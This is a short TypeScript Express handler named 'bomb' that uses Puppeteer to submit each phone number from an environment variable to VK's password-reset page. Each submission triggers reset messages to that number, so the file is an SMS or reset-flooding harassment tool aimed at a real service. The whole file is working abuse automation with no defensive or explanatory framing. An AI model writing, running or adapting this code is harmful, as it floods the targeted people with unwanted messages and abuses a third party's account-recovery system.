import { Request, Response } from "express";
import puppeteer from "puppeteer";
import wait from "./utils/wait";
import selectors from "./selectors";
import range from "./utils/range";

export async function bomb(req: Request, res: Response) {
  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");

  const phoneNumbers = phoneNumbersStr.split(" ");

  phoneNumbers.forEach(async (phoneNumber) => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    await page.goto("https://id.vk.com/restore/#/resetPassword");
    await wait(3000);
    await page.type(selectors.phoneNumberInput, phoneNumber);
    await page.keyboard.down("Enter");
    await wait(3000);

    await browser.close();
  })
}
